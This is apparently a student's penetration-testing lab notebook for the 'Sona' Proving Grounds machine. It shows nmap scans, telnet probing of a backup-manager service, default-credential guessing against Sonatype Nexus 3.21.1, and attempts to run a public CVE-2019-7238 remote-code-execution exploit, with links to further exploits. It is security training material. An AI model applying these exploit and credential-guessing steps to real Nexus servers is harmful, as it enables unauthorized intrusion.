# Sona

# Methodology

## 23 - Nexus Backup Manager
Understand how it works & Interact  [ ] `(I)`
- [ ] Find the Official Documentation
- [ ] Google
Custom ways of Exploitation
- [ ] Hacktricks
Search & Test for Vulnerabilities `(I)`
- [ ] Searchsploit
- [ ] Google
- [ ] More
Logging in
Brute Force `I` 
- [x] `admin` : `admin`, `admin`:`password`, `guest`:`guest`, `backup`:`backup`
- [ ] Same as username (eg. `mario` : `mario`)
- [ ] rockyou.txt
- [ ] More


## 8081 - Nexus Repo Manager
Understand how it works & Interact  [ ] `(I)`
- [ ] Find the Official Documentation
- [ ] Google
Custom ways of Exploitation
- [ ] Hacktricks
Search & Test for Vulnerabilities `(I)`
- [x] Searchsploit
	- [ ] RCE
		- [ ] Sonatype Nexus 3.21.1 - Remote Code Execution (Authenticated)   java/webapps/49385.py
		- [ ] Metasploit Java https://www.exploit-db.com/exploits/48343
- [ ] Google
- [ ] More
Logging in
Brute Force `I` 
- [x] `admin` : `admin`, `admin`:`password`, `guest`:`guest`, `backup`:`backup`
- [ ] Same as username (eg. `mario` : `mario`)
- [ ] rockyou.txt
- [ ] More

# Enumeration

## nmap

```
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Sona]
└─$ sudo nmap -p- 192.168.51.159                               

[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-05 19:05 EST
Stats: 0:06:36 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 78.23% done; ETC: 19:14 (0:01:50 remaining)
Nmap scan report for 192.168.51.159
Host is up (0.26s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
23/tcp   open  telnet
8081/tcp open  blackice-icecap

Nmap done: 1 IP address (1 host up) scanned in 452.47 seconds

┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Sona]
└─$ sudo nmap -p23,8081 -sV -sC -A -T4  192.168.51.159

Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-05 19:14 EST
Nmap scan report for 192.168.51.159
Host is up (0.26s latency).

PORT     STATE SERVICE VERSION
23/tcp   open  telnet?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     ====================
|     NEXUS BACKUP MANAGER
|     ====================
|     ANSONE Answer question one
|     ANSTWO Answer question two
|     BACKUP Perform backup
|     EXIT Exit
|     HELP Show help
|     HINT Show hints
|     RECOVER Recover admin password
|     RESTORE Restore backup
|     Incorrect
|   NULL, tn3270: 
|     ====================
|     NEXUS BACKUP MANAGER
|     ====================
|     ANSONE Answer question one
|     ANSTWO Answer question two
|     BACKUP Perform backup
|     EXIT Exit
|     HELP Show help
|     HINT Show hints
|     RECOVER Recover admin password
|_    RESTORE Restore backup
8081/tcp open  http    Jetty 9.4.18.v20190429
| http-robots.txt: 2 disallowed entries 
|_/repository/ /service/
|_http-server-header: Nexus/3.21.1-01 (OSS)
|_http-title: Nexus Repository Manager
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port23-TCP:V=7.91%I=7%D=2/5%Time=61FF1307%P=x86_64-pc-linux-gnu%r(NULL,
SF:F0,"====================\nNEXUS\x20BACKUP\x20MANAGER\n=================
SF:===\nANSONE\x20\tAnswer\x20question\x20one\nANSTWO\x20\tAnswer\x20quest
SF:ion\x20two\nBACKUP\x20\tPerform\x20backup\nEXIT\x20\tExit\nHELP\x20\tSh
SF:ow\x20help\nHINT\x20\tShow\x20hints\nRECOVER\tRecover\x20admin\x20passw
SF:ord\nRESTORE\tRestore\x20backup\n")%r(GenericLines,FA,"================
SF:====\nNEXUS\x20BACKUP\x20MANAGER\n====================\nANSONE\x20\tAns
SF:wer\x20question\x20one\nANSTWO\x20\tAnswer\x20question\x20two\nBACKUP\x
SF:20\tPerform\x20backup\nEXIT\x20\tExit\nHELP\x20\tShow\x20help\nHINT\x20
SF:\tShow\x20hints\nRECOVER\tRecover\x20admin\x20password\nRESTORE\tRestor
SF:e\x20backup\nIncorrect\n")%r(tn3270,F0,"====================\nNEXUS\x20
SF:BACKUP\x20MANAGER\n====================\nANSONE\x20\tAnswer\x20question
SF:\x20one\nANSTWO\x20\tAnswer\x20question\x20two\nBACKUP\x20\tPerform\x20
SF:backup\nEXIT\x20\tExit\nHELP\x20\tShow\x20help\nHINT\x20\tShow\x20hints
SF:\nRECOVER\tRecover\x20admin\x20password\nRESTORE\tRestore\x20backup\n")
SF:%r(GetRequest,FA,"====================\nNEXUS\x20BACKUP\x20MANAGER\n===
SF:=================\nANSONE\x20\tAnswer\x20question\x20one\nANSTWO\x20\tA
SF:nswer\x20question\x20two\nBACKUP\x20\tPerform\x20backup\nEXIT\x20\tExit
SF:\nHELP\x20\tShow\x20help\nHINT\x20\tShow\x20hints\nRECOVER\tRecover\x20
SF:admin\x20password\nRESTORE\tRestore\x20backup\nIncorrect\n")%r(HTTPOpti
SF:ons,FA,"====================\nNEXUS\x20BACKUP\x20MANAGER\n=============
SF:=======\nANSONE\x20\tAnswer\x20question\x20one\nANSTWO\x20\tAnswer\x20q
SF:uestion\x20two\nBACKUP\x20\tPerform\x20backup\nEXIT\x20\tExit\nHELP\x20
SF:\tShow\x20help\nHINT\x20\tShow\x20hints\nRECOVER\tRecover\x20admin\x20p
SF:assword\nRESTORE\tRestore\x20backup\nIncorrect\n")%r(RTSPRequest,FA,"==
SF:==================\nNEXUS\x20BACKUP\x20MANAGER\n====================\nA
SF:NSONE\x20\tAnswer\x20question\x20one\nANSTWO\x20\tAnswer\x20question\x2
SF:0two\nBACKUP\x20\tPerform\x20backup\nEXIT\x20\tExit\nHELP\x20\tShow\x20
SF:help\nHINT\x20\tShow\x20hints\nRECOVER\tRecover\x20admin\x20password\nR
SF:ESTORE\tRestore\x20backup\nIncorrect\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|5.X (85%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 - 5.6 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   254.62 ms 192.168.49.1
2   254.85 ms 192.168.51.159

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.33 seconds
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Sona]
└─$ 

```

## 23 - Telnet

```
┌──(kali㉿kali)-[~]
└─$ telnet 192.168.51.159  23
Trying 192.168.51.159...
Connected to 192.168.51.159.
Escape character is '^]'.
whoami
====================
NEXUS BACKUP MANAGER
====================
ANSONE  Answer question one
ANSTWO  Answer question two
BACKUP  Perform backup
EXIT    Exit
HELP    Show help
HINT    Show hints
RECOVER Recover admin password
RESTORE Restore backup
Incorrect
Connection closed by foreign host.
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$    
```

```
┌──(kali㉿kali)-[~]
└─$ telnet 192.168.51.159  23                                                                                                                                       1 ⨯
Trying 192.168.51.159...
Connected to 192.168.51.159.
Escape character is '^]'.
====================
NEXUS BACKUP MANAGER
====================
ANSONE  Answer question one
ANSTWO  Answer question two
BACKUP  Perform backup
EXIT    Exit
HELP    Show help
HINT    Show hints
RECOVER Recover admin password
RESTORE Restore backup
HINT
1.What is your zodiac sign?
2.What is your favorite color?
RESTORE
Restoring backup...
HELP
ANSONE  Answer question one
ANSTWO  Answer question two
BACKUP  Perform backup
EXIT    Exit
HELP    Show help
HINT    Show hints
RECOVER Recover admin password
RESTORE Restore backup
RECOVER admin
Incorrect
Connection closed by foreign host.
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$
```

## 8081 - Web - Sonatype Nexus Repository Manager 3.21.1-01

![](Pasted%20image%2020220206081659.png)

### Logging in tests

Failed
```
admin:admin
admin:password
admin:sona
sona:sona
guest:guest
backup:backup
admin:admin123
```


![](Pasted%20image%2020220206082034.png)

# Exploits & Exploitation
## CVE
```
┌──(kali㉿kali)-[/tmp]
└─$ git clone https://github.com/jas502n/CVE-2019-7238.git                                                                                                          1 ⨯
Cloning into 'CVE-2019-7238'...
remote: Enumerating objects: 42, done.
remote: Total 42 (delta 0), reused 0 (delta 0), pack-reused 42
Receiving objects: 100% (42/42), 531.38 KiB | 9.49 MiB/s, done.
Resolving deltas: 100% (16/16), done.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cd CVE-2019-7238          
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/CVE-2019-7238]
└─$ python3 CVE-2019-7238.py 192.168.51.159:8081 whoami
  File "/tmp/CVE-2019-7238/CVE-2019-7238.py", line 22
    print banner
          ^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print(banner)?
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/CVE-2019-7238]
└─$ python CVE-2019-7238.py 192.168.51.159:8081 whoami                                                                                                              1 ⨯
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.

   _______      ________    ___   ___  __  ___      ______ ___  ____   ___  
  / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \    |____  |__ \|___ \ / _ \ 
 | |     \ \  / /| |__ ______ ) | | | || | (_) |______ / /   ) | __) | (_) |
 | |      \ \/ / |  __|______/ /| | | || |\__, |______/ /   / / |__ < > _ < 
 | |____   \  /  | |____    / /_| |_| || |  / /      / /   / /_ ___) | (_) |
  \_____|   \/   |______|  |____|\___/ |_| /_/      /_/   |____|____/ \___/ 
                                                                            
                        Nexus RCE < 3.15.0

                        Python By jas502n  

             python  CVE-2019-7238.py http://10.10.20.166:8081 whoami                                                  

Traceback (most recent call last):
  File "CVE-2019-7238.py", line 53, in <module>
    CVE_2019_7238(url,cmd)
  File "CVE-2019-7238.py", line 41, in CVE_2019_7238
    r =requests.post(vuln_url, data=payload,headers=headers, verify=False)
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/api.py", line 119, in post
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/api.py", line 61, in request
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/sessions.py", line 530, in request
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/sessions.py", line 637, in send
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/sessions.py", line 728, in get_adapter
requests.exceptions.InvalidSchema: No connection adapters were found for u'192.168.51.159:8081/service/extdirect'
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/CVE-2019-7238]
└─$ python CVE-2019-7238.py http://192.168.51.159:8081 whoami                                                                                                       1 ⨯
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.

   _______      ________    ___   ___  __  ___      ______ ___  ____   ___  
  / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \    |____  |__ \|___ \ / _ \ 
 | |     \ \  / /| |__ ______ ) | | | || | (_) |______ / /   ) | __) | (_) |
 | |      \ \/ / |  __|______/ /| | | || |\__, |______/ /   / / |__ < > _ < 
 | |____   \  /  | |____    / /_| |_| || |  / /      / /   / /_ ___) | (_) |
  \_____|   \/   |______|  |____|\___/ |_| /_/      /_/   |____|____/ \___/ 
                                                                            
                        Nexus RCE < 3.15.0

                        Python By jas502n  

             python  CVE-2019-7238.py http://10.10.20.166:8081 whoami                                                  

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/CVE-2019-7238]
└─$ 
```

## Auth Exploit

https://www.google.com/search?q=nexus+repository+manager+3.2.1.1-01+exploit&sxsrf=APq-WBvX3GhHL5lcE1d4CdW1dLp0akaN2A%3A1644106699438&ei=yxP_YcSJGvjhz7sPp9uVgAE&ved=0ahUKEwiEm6ve5un1AhX48HMBHadtBRAQ4dUDCA8&uact=5&oq=nexus+repository+manager+3.2.1.1-01+exploit&gs_lcp=Cgdnd3Mtd2l6EAMyCAghEBYQHRAeSgQIQRgBSgQIRhgAUPEDWI4NYM0OaAFwAHgAgAFDiAHVA5IBATiYAQCgAQHAAQE&sclient=gws-wiz
- https://vulmon.com/exploitdetails?qidtp=packetstorm_exploits&qid=a12c5c9c2a03e92f9658005e463fde70
- https://www.exploit-db.com/exploits/49385



# Privesc

# Others